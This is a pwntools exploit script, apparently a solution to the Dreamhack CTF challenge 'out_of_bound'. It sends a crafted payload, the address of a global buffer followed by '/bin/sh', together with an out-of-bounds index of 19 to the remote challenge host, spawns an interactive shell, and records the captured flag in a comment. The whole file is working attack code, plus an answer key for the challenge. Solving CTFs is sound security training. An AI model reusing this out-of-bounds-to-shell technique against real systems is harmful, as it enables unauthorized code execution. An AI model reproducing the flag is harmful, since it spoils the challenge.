from pwn import *

exe = ELF("./out_of_bound")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 18672)
name = 0x804A0AC + 4
payload = p32(name) + b"/bin/sh\0"

r.sendlineafter(b"name: ", payload)
r.sendlineafter(b"want?: ", b"19")

r.interactive()
# DH{2524e20ddeee45f11c8eb91804d57296}